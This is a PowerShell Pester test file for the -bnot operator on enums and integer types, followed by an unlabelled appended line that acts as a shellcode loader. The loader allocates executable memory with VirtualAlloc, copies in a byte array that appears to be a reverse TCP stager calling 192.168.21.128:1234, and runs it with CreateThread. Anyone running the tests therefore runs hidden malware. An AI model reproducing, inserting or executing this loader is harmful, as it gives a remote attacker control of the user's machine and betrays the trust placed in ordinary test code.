


$baseTypes = @{
    [SByte] = 'sbyte';     [Byte] = 'byte'
    [Int16] = 'short';     [UInt16] = 'ushort'
    [Int32] = 'int';       [UInt32] = 'uint'
    [Int64] = 'long';      [UInt64] = 'ulong'
}

$ns = [Guid]::NewGuid() -replace '-',''

$typeDefinition = "namespace ns_$ns`n{"

$enumTypeNames = foreach ($baseType in $baseTypes.Keys)
{
    $baseTypeName = $baseTypes[$baseType]
    $typeDefinition += @"
    public enum E_$baseTypeName : $baseTypeName
    {
        Min = $($baseType::MinValue),
        MinPlus1 = $($baseType::MinValue + 1),
        MaxMinus1 = $($baseType::MaxValue - 1),
        Max = $($baseType::MaxValue)
    }
"@

    "ns_$ns.E_$baseTypeName"
}

$typeDefinition += "`n}"

Write-Verbose $typeDefinition
Add-Type $typeDefinition

Describe "bnot on enums" -Tags "CI" {
    foreach ($enumType in [type[]]$enumTypeNames)
    {
        Context $enumType.Name {
            It "max - 1" {
                $res = -bnot $enumType::MaxMinus1
                $res | Should -Be $enumType::MinPlus1
                $res | Should -BeOfType $enumType
            }

            It "min + 1" {
                $res = -bnot $enumType::MinPlus1
                $res | Should -Be $enumType::MaxMinus1
                $res | Should -BeOfType $enumType
            }

            It "Max" {
                $res = -bnot $enumType::Max
                $res | Should -Be $enumType::Min
                $res | Should -BeOfType $enumType
            }

            It "Min" {
                $res = -bnot $enumType::Min
                $res | Should -Be $enumType::Max
                $res | Should -BeOfType $enumType
            }
        }
    }
}

Describe "bnot on integral types" -Tags "CI" {
    foreach ($baseType in $baseTypes.Keys)
    {
        Context $baseType.Name  {

            $max = $baseType::MaxValue
            $maxMinus1 = $max - 1
            $min = $baseType::MinValue
            $minPlus1 = $min + 1

            if ([System.Runtime.InteropServices.Marshal]::SizeOf([type]$baseType) -lt 4)
            {
                $expectedResultType = [int]
            }
            else
            {
                $expectedResultType = $baseType
            }

            if ($baseType -eq [byte] -or $baseType -eq [uint16])
            {
                
                
                
                It "max - 1" {
                    $res = -bnot $maxMinus1
                    $res | Should -Be (-bnot [int]$maxMinus1)
                    $res | Should -BeOfType $expectedResultType
                }

                It "min + 1" {
                    $res = -bnot $minPlus1
                    $res | Should -Be (-bnot [int]$minPlus1)
                    $res | Should -BeOfType $expectedResultType
                }

                It "max" {
                    $res = -bnot $max
                    $res | Should -Be (-bnot [int]$max)
                    $res | Should -BeOfType $expectedResultType
                }

                It "min" {
                    $res = -bnot $min
                    $res | Should -Be (-bnot [int]$min)
                    $res | Should -BeOfType $expectedResultType
                }
                return
            }

            It "max - 1" {
                $res = -bnot $maxMinus1
                $res | Should -Be $minPlus1
                $res | Should -BeOfType $expectedResultType
            }

            It "min + 1" {
                $res = -bnot $minPlus1
                $res | Should -Be $maxMinus1
                $res | Should -BeOfType $expectedResultType
            }

            It "max" {
                $res = -bnot $max
                $res | Should -Be $min
                $res | Should -BeOfType $expectedResultType
            }

            It "min" {
                $res = -bnot $min
                $res | Should -Be $max
                $res | Should -BeOfType $expectedResultType
            }
        }
    }
}


$6pVS = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $6pVS -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x15,0x80,0x68,0x02,0x00,0x04,0xd2,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$2Ise=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($2Ise.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$2Ise,0,0,0);for (;;){Start-sleep 60};

